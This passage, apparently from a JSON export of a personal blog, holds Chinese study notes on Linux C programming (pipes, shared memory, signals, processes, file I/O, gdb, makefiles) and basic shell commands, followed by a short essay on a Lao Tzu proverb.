___cplusplusextern \"C\"&#123;#endif#ifdef __cplusplus&#125;#endif 无名管道半双工，只能读或写，只能在相关的、有共同祖先的进程间使用(fork execve) 1int pipe(int fledes[2]) 如果成功建立管道，会打开两个文件描述符，保存在一个整数数组中第一个文件描述符用于读取数据，第二个文件描述符用于写入数据如果出错返回-1·同时设置errno关闭一个管道用close()读写管道与读写文件一样，调用write与read函数管道是用来交换数据的，试图对一个管道两端进行读写操作是一个严重的错误，只存在一个读一个写。 有名管道有名管道(FIFO)长久稳定，存在于文件系统中，可以让无关联的进程之间交换数据一个shell命令可以建立有名管道mkfifo[option] name mkfifo创建一个名为name的有名管道mkfifo fifo1 创建一个有名管道fifo1cat &lt; fifo1 通过cat命令从fifo1中读取数据ls &gt; fifo1 将ls命令的结果写入fifo1数据 创建fifo 1int mkfifo(const char *pathname, mode_tmode) 成功返回0，失败返回-1，设置变量errno 删除fifo 1int unlink(const char *pathname) 成功返回0，失败返回-1，设置变量errno 打开关闭fifo 12int open(const char *pathname, int flags)int close(int fd) open中的参数flags为O_RDONLY 将阻塞open调用，一直到另一个进程为写入数据打开FIFO为止。相同的，O_WRONLY也导致阻塞一直到为读出数据打开FIFO为止。 共享内存共享内存是由内核出于在多个进程间交换信息的目的留下的一块内存区。如果段的权限设置恰当，每个要访问该断内存的进程都可以把它映射到自己的私有地址空间。如果一个进程跟新了段中的数据，其他进程也可以看到。一个进程创建的段，里一个进程也可以写。每个进程都把它自己对共享内存的映像放入自己的地址空间。 123&lt;sys/ipc.h&gt;&lt;sys/shm.h&gt;int shmget(key_t key, size_t size, intshm-flg) 参数key既可以是IC_PRIVATE(系统设置)，也可以是ftok函数的返回关键字size指定段的大小flags为8进制，设置权限0xxx函数成功返回标识符，失败返回-1 通过ipcs –m 查看共享内存通过ipcrm shm shmid删除共享内存附加共享内存 12void *shmat(int shmid, const vod *ahmaddr,int shmflg);int shmdt(const void *shmaddr);` shmid是要附加共享内存的标识符，shmaddr总是设置为0(系统分配)。参数shmflg可以为SHM_RDONLY，这意味着附加段是只读的。成功返回被附加段的地址，失败-1，设置errno函数shmdt是将附加在shmaddr的段从调用进程的地址空间分离出去，这个地址必须是shmat返回的。 捕获信号1int pause(void); pause函数挂其他的进程直到消息到达。调用进程必须有能力处理送达的信号，否则信号的默认部署就会发生。只有进程捕获到一个信号的时候pause才会返回，信号处理发生在pause返回前执行。pause总是返回-1，errno变量设置为EINTR每个进程能够决定响应除了SIGSTOP和SIGKILL之外的其他所有信号，这两个信号不能捕获或者忽略。当一个进程调用fork的时候，其子进程继承父进程的信号处理方式，所有信号捕捉函数的地址在子进程中是有意义的。 signal函数12&lt;signal.h&gt;void (*signal(int signo, void(*func)(int)))(int ); linux/unix处理信号最常用的接口signo为信号名，func接受此信号的调用函数，该函数的参数代表捕获到的信号值kill –s +信号名+pid 可以看出kill是用来发信号的 发送信号使用kill命令使用kill函数 123&lt;signal.h&gt;&lt;sys/typed.h&gt;Int kill(pid_t pid,int sig); pid指定要发信号的进程，sig要发送的信号使用raise函数 12&lt;signal.h&gt;int rasie(int signo); kill函数将信号发送给别的进程，raise函数允许进程向自身发送信号。 1raise(digno) = kill(getpid(), signo); alarm函数设置一个定时器，当定时器到了就给自己发SIGALRM信号，alarm的默认行为是退出进程，所以必须要捕获。所以最好对每个可捕获的消息，都要写捕获函数。 12&lt;unistd.h&gt;unsigned int alarm(unsigned int seconds); seconds是计时器时间，一个进程只可以设置一次。再次把seconds设置为0，取消alarm。 作业控制信号SIGCHLD 子进程已停止或终止SIGCONT 如果进程停止，使其继续进行SIGSTOP 停止信号，无法捕获SIGTTIN 后台进程组成员读控制终端SIGTTOU 后台进程组成员写控制终端除了SIFCHLD以外，大多数程序不处理这些信号。Shell程序一般需要处理这些信号。信号用于大多数复杂的应用中。","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"},{"name":"signal","slug":"signal","permalink":"http://coordinate.wang/tags/signal/"},{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"pipe","slug":"pipe","permalink":"http://coordinate.wang/tags/pipe/"}]},{"title":"linux Day5","slug":"2017-03-05-linux-day5","date":"2017-03-04T16:00:00.000Z","updated":"2018-02-18T03:29:05.904Z","comments":true,"path":"2017/03/05/2017-03-05-linux-day5/","link":"","permalink":"http://coordinate.wang/2017/03/05/2017-03-05-linux-day5/","excerpt":"","text":"processPID进程号 PPID父进程号 都为非零整数所有的进程追述到init，Init进程是linux内核启动后第一个执行的进程，进程号1getpid()获取pid getppid()获取ppid getlogingetlogin()获取登陆者信息getpwnam()返回一个指向passwd结构的指针,返回的是/etc/passwd文件中与该登录名一致的信息printf(&ldquo;user name = %s\\n&rdquo;, ps-&gt;pw_name) 创建进程 1int system(const char *string) system函数传递给/bin/sh &ndash;c来执行string所指向的内容没有找到/bin/sh返回127，出错返回-1，成功返回0，string为NULL返回非零 fork1pid_t fork(void); 父进程中fork返回子进程的pid，子进程中fork返回0fork创建的新进程是父进程的副本，区别在于没有继承父进程的超时设置，文件锁，未决信号子进程中调用fork不会产生副本注意一点：子进程fork之前的代码不执行，执行两次父进程一次，子进程一次fork的主要用处：服务端程序，tty 中显示？表示没有控制台程序两个独立的进程，用同一个文件描述符 execve1int execve(const char *path, const char *argv, char *const envp[]); path 要执行的文件完整路径argv传递给程序完整参数列表，包括argv[0]，一般是执行程序的名字envp一般指向execed程序的环境指针，可以设为NULLfork创建一个新进程，产生一个新的pidexecve用被执行的程序完全替代调用进程的映像execve启动一个新程序，替代原有进程，所有被执行进程的pid不变，只是改变了代码 wait waitpid123&lt;sys/wait.h&gt;pid_t wait(int *status)pid_t waitpid(pid_t pid, int *status, int options); status保存子进程的退出状态，退出返回的值WEXITSTATUS(status)pid为等待进程的pid，接受如下几个值-1 等待任何pgid等于pid的绝对子进程1 等待任何子进程0 等待任何pgid等于调用进程的子进程&gt;0 等待pid等于pid的子进程 进程识别码(PID)：用来唯一标识进程。进程组识别码(Process Group ID)：一个进程可以属于某个进程组。可以发送信号给一组进程。对于进程组ID，一般来说，一个进程在shell下执行，shell程序就将该进程的PID赋给该进程的进程组ID，从该进程派生的子进程都拥有父进程所属的进程组ID，除非父进程将子进程的所属组ID设置成与该子进程的PID一样。 僵尸进程：一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵死进程。 孤儿进程：一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"}]},{"title":"linux Day4","slug":"2017-03-04-linux-day4","date":"2017-03-03T16:00:00.000Z","updated":"2018-02-18T03:29:05.902Z","comments":true,"path":"2017/03/04/2017-03-04-linux-day4/","link":"","permalink":"http://coordinate.wang/2017/03/04/2017-03-04-linux-day4/","excerpt":"","text":"fstatfstat获取文件信息 1fstat(int fd, struct stat *buf) stat获取文件信息 1int stat(const char *path, struct stat *buf) stat结构主要描述文件的信息 ls的信息stat.st_mode判断文件类型S_ISREG(stat.st_mode) regular fileS_ISDIR(stat.st_mode) directorystat.st_size代表文件大小 getpass1char *getpass(const char *prompt) 读写用户输入，不回显prompt提示符 函数返回密码 fopen fclose fread fwrite12FILE *p fopen(const char* path, const char *mode);int fclose(FILE *stream); Mode:r open text file for readingr+ open for writing and readingw truncate(缩短) file to zero length orcreate text file for writing binary systemwb in the windowsw+ open for reading writing .the file is created if it does not exista open for appending . the file is created if it does not exista+ open for writing and reading(writing at end of file )the file is created if it does not exist 12size_t fread(void *ptr,size_t size, size_t nmeb, FILE *stream)size_t fwrite(void *ptr,size_t size, size_t nmeb, FILE *stream) ptr 指向那个缓冲区size控制记录大小nmemb记录数函数返回记录或写的记录数 库函数fopen fclose fread fwrite 尽量使用库函数，不要使用系统函数，便于移植 fprintf fscanf fgets fputs1int fprintf(FILE *stream, const char *format,...); 与printf区别只是一个输入到标准输出文件，一个输出到普通文件 1int fscanf(FILE *stream, const char *format,...); 不会读取文件末尾的回车 1char fgets(char *s, int size, FILE *stream); fgets从文件读取一行，返回EOF代表文件结尾（会读取回车） 1int fputs(const char *s,FILE *stream); fputs从文件写入一行 remove12int remove(const char *pathname)int remove(const char *oldpath, const char *newpath); remove函数删除pathname指向的文件rename修改文件名执行成功返回0，执行失败返回-1，错误码保存在变量errno中 divWritelog12345678910111213141516171819202122232425void writelog(const char *log)&#123; time_t tDate; struct tm *eventTime; time(&amp;amp;tDate); //get the current system time eventTime = localtime(&amp;amp;tDate); //make the time_t to the struct tm int iYear = eventTime-&amp;gt;tm_year + 1900; int iMon = eventTime-&amp;gt;tm_mon + 1; int iDay = eventTime-&amp;gt;tm_mday; int iHour = eventTime-&amp;gt;tm_hour; int iMin = eventTime-&amp;gt;tm_min; int iSec = eventTime-&amp;gt;tm_sec; char sDate[16]; sprintf(sDate, \"%04d-%02d-%02d\", iYear, iMon, iDay); //right alignment char sTime[16]; sprintf(sTime, \"%02d:%02d:%02d\", iHour, iMin, iSec); char s[1024]; sprintf(s, \"%s %s %s\\n\", sDate, sTime, log); FILE *fd = fopen(\"my.log\", \"a+\"); if(fd == NULL)&#123; printf(\"write og my.log error:%s \\n\", strerror(errno)); &#125;else&#123; fputs(s, fd); &#125; fclose(fd);&#125; getcwd1char *getcwd(char *buf, size_t size); getcwd函数把当前工作目录的绝对路径名复制到buf，size表示buf的大小，buf不够返回NULL执行程序时所在的目录，不一定是程序所在的目录如果在根目录，则可以通过/1/main执行main程序宿主目录：用户登录时的目录 opendir readdir closediropendir打开目录 DIR opendir(const char pathname)readdir读取目录内容 struct dirent readdir(DIR dir)closedir关闭目录 int close(DIR *dir) &lt;dirent.h&gt;中声明,出错返回NULL eclipse注释ctrl +/ 注释文件与取消注释文件 //ctrl+shift+/ 注释文件 /**/ctrl+shift+\\ 取消注释文件ctrl+d 删除","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"}]},{"title":"linux Day3","slug":"2017-03-03-linux-day3","date":"2017-03-02T16:00:00.000Z","updated":"2018-02-18T03:29:05.900Z","comments":true,"path":"2017/03/03/2017-03-03-linux-day3/","link":"","permalink":"http://coordinate.wang/2017/03/03/2017-03-03-linux-day3/","excerpt":"","text":"修改文件后要让文件生效. 文件 调试gdbgdb 文件 core文件gdb &ndash;q 文件 core文件 关闭无用信息 gdb 文件run 在gdb下运行where 显示出错的代码list 显示出错代码的上下print 显示变量的值break 设置断点 +行号/+函数名/+文件名：行号or函数名continue 从断点后继续执行delete 删除一个断点info break 查看断点quit 推出调试set variable varname = value 设置变量的值step 单步进入函数next 当遇到函数时，函数当成一条语句return+数据 停止当前函数，数据为返回值 Stack 栈123int abc(int a,int b)&#123; return a + b;&#125; _stdcall Pascal默认调用函数方式函数从右向左压入栈函数参数由被调用者压入或弹出栈 1int _attribute_((stdcall)) abc(int a,int b) _cdecl c/c++默认调用函数方式函数从右向左压入栈函数参数由被调用者压入或弹出栈 1int _attribute_((cdecl)) abc(int a,int b) 如果用free释放“new创建的动态对象”，那么该对象因无法执行析构函数而可能导致程序出错。如果用delete释放“malloc申请的动态内存”，结果也会导致程序出错，但是该程序的可读性很差。所以new/delete必须配对使用，malloc/free也一样。看看《Effective C++》这个吧。摘一段：把new和delete 与malloc和 free混在一起用也是个坏想法。对一个用new获取来的指针调用 free，或者对一个用 malloc 获取来的指针调用 delete，其后果是不可预测的。大家都知道&ldquo;不可预测&rdquo;的意思：它可能在开发阶段工作良好，在测试阶段工作良好，但也可能会最后在你最重要的客户的脸上爆炸。 内存分配calloc(sizeof(data type),num) 分配内存并置零realloc 分配的内存连续，如果不够，会找个新内存，把copy过去realloc不初始化不要用悬空指针 1char *s = NULL; free(s); s = NULL;释放完再置为空 不建议使用scanf，无法输入空格，不检测越界问题 123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; char *longNum1 = (char*)malloc(10); char *longNum2 = (char*)malloc(10); scanf(\"%9s\",longNum1); scanf(\"%9s\",longNum2); printf(\"%s\\n\",longNum1); printf(\"%s\\n\",longNum2); return 0;&#125; 用read(STDIN_FILENO，buf, sizeof(buf))标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。 openopen(file, flags)Flags:O_RDONLY,O_WRONLY,O_RDWR,O_CREAT,O_APPEND成功后返回一个文件描述符open失败后会返回-1，并设置errno变量close() 关闭 tty 查看屏幕位置file+文件 查看文件类型cat abc.cpp &gt; a.txt 将abc的结果 输出到a.txtchmod 000 file 修改权限 000 expression permission deniedsleep(1) 延迟1susleep() 微秒","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"}]},{"title":"linux Day2","slug":"2017-03-02-linux-day2","date":"2017-03-01T16:00:00.000Z","updated":"2018-02-18T02:37:53.560Z","comments":true,"path":"2017/03/02/2017-03-02-linux-day2/","link":"","permalink":"http://coordinate.wang/2017/03/02/2017-03-02-linux-day2/","excerpt":"","text":"int main(int argc,char *argv[])argc 代表参数个数a.out 1 2 表示三个参数argv 表示指向参数的指针数组 数组指针与指针数组int (p)[] 数组指针（行指针）类似于函数指针int p[] 指针数组 gcc指令gcc &ndash;o hello hello.c 编译hello.c 文件生成hello文件gcc &ndash;o hello1.c &ndash;E hello.c 只进行预编译，预编译将结果输出到hello1.c文件中gcc &ndash;o hello.o &ndash;c hello1.c 只进行编译不链接gcc &ndash;o hello hello.o 连接-o filename 输出文件名-g 包含调试信息-I 连接指定库文件-O 优化编译后的代码-w 关闭所有警告-Wall 开启所有警告编译c++文件连接的时候 gcc &ndash;o hello hello.o &ndash;lstdc++ 编译预编译-&gt;编译-&gt;连接预编译：头文件编译：生成目标代理 *.o连接：连接库代码，生成可执行文件 ldd+执行文件 查看用到哪些库文件nm+执行文件 列出某些文件中的符号c++在编译完代码后函数名称会发生改变，主要是由于函数重载，所以c++写不了dll文件 安装文件rpm &ndash;ivh 安装软件rpm &ndash;e 卸载软件 makefile规则12345start:hello.o 表示需要依赖 .o文件 gcc &amp;ndash;o hello hello.o @echo &amp;lsquo;--------------------------&amp;lsquo; 表示只输出结果hello.o: gcc &amp;ndash;o hello.o &amp;ndash;c hello.c 注意不是空格键而是tab键make执行文件make target 执行表号下的语句 变量varname=some_text$(varname)引用该变量例如：CC=gccgcc 改为 $(CC) 1234CC=gcc SRCS=hello.cOBJS=$(SRCS:.c=.o) 将SRCS变量中的.c 替代为 .oEXEC=hello 模式规则.SUFFIXES:.c .o 便是两个文件有关联表示任意x.c文件与x.o文件 1- .c.o: 任何x.o文件都从x.c编译而来 例子： 1234567891011121314.SUFFIXES:.c .o //.c和.o建立关联CC=gccSRCS=hello.c\\ add.c //同时编译两个.c文件OBJS=$(SRCS:.c=.o) 将SRCS变量中的.c 替代为 .o //ORJS=hello.o add.oEXEC=hellostart:$(OBJS) //依赖hello.o add.o $(CC) &amp;ndash;o $(EXEC) $(OBJS) @echo &amp;lsquo;---------------------ok---------------------&amp;lsquo;.c.o: $(CC) -o $@ -c $&amp;lt; //自动根据$(OBJS) 中.o的数量循环编译, 直到编&amp;nbsp; //译完所有的.c文件clean: Rm &amp;ndash;f $(OBJS) 常见的make错误No rule to make target &lsquo;target&rsquo; .Stop没有规则可以用;target; is up to datetarget 相关文件没有变化command : Command not foundmake找不到命令missing separator. Stop.空格与tab的问题","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"}]},{"title":"linux Day1","slug":"2017-03-01-linux-day1","date":"2017-02-28T16:00:00.000Z","updated":"2018-02-18T02:37:38.240Z","comments":true,"path":"2017/03/01/2017-03-01-linux-day1/","link":"","permalink":"http://coordinate.wang/2017/03/01/2017-03-01-linux-day1/","excerpt":"","text":"关机shutdown &ndash;h nowpoweroff 显示文件ls &ndash;a 显示所有文件ls &ndash;l 详细显示文件ls &ndash;al 组合使用dir /a windows 平台 1- 表示常规文件；d 表示目录；c 便是字符设备文件；b 表示块设备文件；s 表示管道文件；l 表示连接文件 ls | more 表示分页显示ls &gt; 文件 创建文件 目录cd .. 回到上一级cd 回到起始目录cd / 回到根目录pwd 显示目录cat+文件 看文件内容 查找文件内容grep+参数+内容+文件-n 显示所在行-v 显示出所在行外的所有行 查找文件find +目录 &ndash;name 查找目录下是否有这个名字的文件find+目录 &ndash;user 查找目录下是否与这个人的文件 移除文件rm+参数+文件 移除文件-f 不显示删除信息-r 删文件夹1* 删除所有文件 拷贝文件cp+目标文件+生成文件 移动文件mv+移动文件+目标文件 用此条命令可以改变移动文件的名字 查看进程ps &ndash;a 查看所有进程ps &ndash;u 显示进程所有信息ps &ndash;x 显示没有控制终端的进程top 显示类似任务管理器 查看当前用户whoami 查看登陆用户who 归档管理tar+参数+打包文件名+文件-cvf 打包-xvf 解包 压缩gzip+文件 压缩文件gzip &ndash;d + 文件 解压文件 帮助man+命令 man+参数+命令 General commands System calls Library functions, covering in particular the C standard library Special files (usually devices, those found in /dev) and drivers File formats and conventions Games and screensavers Miscellanea System administration commands and daemons 建立用户useradd &ndash;d /home/test5 tes5passwd test5 建立密码su &ndash; test5 切换到test5用户su &ndash; 切换到root 让linux在当前目录寻找 cd vi .bash_profile 在path后面加:.代表在当前目录寻找 :wq 让文件生效 . .bash_profile 每个用户都有各自的profile文件 网络设置nmtui 图形化设置界面 清屏操作clearcls windows 平台","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"}]},{"title":"千里之行始于足下","slug":"2017-02-14-千里之行始于足下","date":"2017-02-13T16:00:00.000Z","updated":"2017-05-28T03:36:50.489Z","comments":true,"path":"2017/02/14/2017-02-14-千里之行始于足下/","link":"","permalink":"http://coordinate.wang/2017/02/14/2017-02-14-千里之行始于足下/","excerpt":"","text":"123 千里之行，始于足下。谓走一千里路，也是从迈第一步开始的。比喻事情是从头做起，逐步进行的。语出老子·《道德经》·第六十四章：“合抱之木，生于毫末；九层之台，起于垒土；千里之行，始于足下。”易《温尧卿等授官赐绯充沧景江陵判官制》：“夫千里之行，始于足下。苟自强不息，亦何远而不届哉？” 12 春秋时期，著名的哲学家老子根据事物的发展规律提出谨小慎微和慎终如始的主张，他主张：处理问题要在它未发生以前。治理国家要在未乱之前。合抱的大树是细小的幼苗长成，九层的高台是一筐一筐泥土砌成的，千里远的行程是从脚下开始的。","categories":[{"name":"index","slug":"index","permalink":"http://coordinate.wang/categories/index/"}],"tags":[{"name":"Eassy","slug":"Eassy","permalink":"http://coordinate.wang/tags/Eassy/"}]}]}